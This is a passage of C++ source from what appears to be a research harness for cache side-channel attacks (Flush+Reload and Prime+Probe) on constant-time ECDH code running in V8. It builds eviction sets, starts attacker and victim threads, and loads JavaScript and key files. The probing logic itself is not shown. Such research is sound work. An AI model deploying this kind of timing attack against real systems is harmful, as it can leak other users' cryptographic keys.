	if (prim != PRIM_FR && pthread_barrier_init(&attacker_threads_barrier,
	                                            nullptr,
	                                            attacker_count) != 0) {
		log_error("failed to init attacker thread barrier");
		return 1;
	}

	if (prim == PRIM_PP) {
		for (int cl = 0; cl < cache_line_count; ++cl) {
			pp_cfg[cl].label = fr_lines[cl].label;
			pp_cfg[cl].slot = cl;
			pp_cfg[cl].target = (uintptr_t)fr_lines[cl].target;
			PP_thread_config_init(pp_cfg[cl]);
		}

		for (int cl = 0; cl < cache_line_count; ++cl) {
			prepare_evset_thres(
			    pp_cfg[cl].target, &pp_cfg[cl].evset, &pp_cfg[cl].threshold);
		}

		for (int cl = 0; cl < cache_line_count; ++cl) {
			if (pp_cfg[cl].evset == nullptr || pp_cfg[cl].threshold == 0) {
				log_error("cannot build evset for cl%d (%s +0x%03lx)",
				          cl,
				          fr_lines[cl].label,
				          target_lines[cl].off);
				exit(1);
			}
		}
	}

	bool launch_ok = true;
	for (int cl = 0; cl < attacker_count; ++cl) {
		if (pthread_create(&attackers[cl],
		                   nullptr,
		                   prim == PRIM_FR ? v8_attacker_thread_fr :
		                                     v8_attacker_thread_pp,
		                   (void *)&pp_cfg[cl]) != 0) {
			log_error("failed to start attacker thread cl%d", cl);
			launch_ok = false;
			break;
		}
		++started;
	}

	for (int cl = 0; cl < started; ++cl) {
		if (!launch_ok) {
			pthread_cancel(attackers[cl]);
		}
		pthread_join(attackers[cl], nullptr);
	}

	if (prim != PRIM_FR) {
		pthread_barrier_destroy(&attacker_threads_barrier);
	}
	return launch_ok ? 0 : 1;
}

int main(int argc, char *argv[]) {
	bool argv_ok = true;
	{
		int new_argc = 0;
		for (int i = 0; i < argc; ++i) {
			if (strcmp(argv[i], "-pp") == 0) {
				prim = PRIM_PP;
			} else if (strncmp(argv[i], "-runs=", 6) == 0) {
				victim_runs = atoi(argv[i] + 6);
			} else if (strncmp(argv[i], "-warmup=", 8) == 0) {
				warmup_runs = atoi(argv[i] + 8);
			} else {
				argv[new_argc++] = argv[i];
			}
		}
		argc = new_argc;
	}
	if (!argv_ok) {
		return 1;
	}

	char def_src[512], def_rep[512], def_key[512];
	const char *src_path = argc > 1 ? argv[1] : nullptr;
	const char *rep_path = argc > 2 ? argv[2] : nullptr;
	key_path = argc > 3 ? argv[3] : nullptr;
	if (use_csi) {
		const char *root = find_project_root();
		if (!src_path) {
			snprintf(def_src,
			         sizeof(def_src),
			         "%s/experiments/v8_constant_time_js/js/ecdh_ct_eval.js",
			         root);
			src_path = def_src;
		}
		if (!rep_path) {
			snprintf(def_rep,
			         sizeof(def_rep),
			         "%s/experiments/v8_constant_time_js/js/ecdh_ct_repeat.js",
			         root);
			rep_path = def_rep;
		}
		if (!key_path) {
			snprintf(def_key,
			         sizeof(def_key),
			         "%s/experiments/v8_constant_time_js/ec_key_zeros.hex",
			         root);
			key_path = def_key;
		}
	}
	if (!src_path || !rep_path || !key_path) {
		print_helper(argc, argv);
		return 1;
	}
	source_str = read_file(src_path);
	repeat_str = read_file(rep_path);

	const char *paths[2] = { src_path, rep_path };
	for (int i = 0; i < 2; ++i) {
		const char *s = i == 0 ? source_str : repeat_str;
		if (s) {
			continue;
		}
		log_error("could not read %s file '%s'%s",
		          i == 0 ? "source" : "repeat",
		          paths[i],
		          paths[i][0] == '-' ?
		              " -- that looks like a flag, not a path. Attacker flags "
		              "take ONE dash (-pp, -fr, -runs=) and go before the "
		              "paths; V8 flags go AFTER all three paths." :
		              "");
	}
	if (!source_str || !repeat_str) {
		return 1;
	}

	reset_sync_ctx(V8_PROJ_ID);

	pthread_t victim_pthread = 0;

	v8::V8::InitializeICUDefaultLocation(argv[0]);
	v8::V8::SetFlagsFromCommandLine(&argc, argv, true);

	if (pthread_create(&victim_pthread, nullptr, v8_victim_thread, nullptr) !=
	    0) {
		log_error("failed to start the victim thread");
		return 1;
	}
	int rc = v8_ctjs_ecdh_attack();

	pthread_join(victim_pthread, nullptr);

	return rc;
}
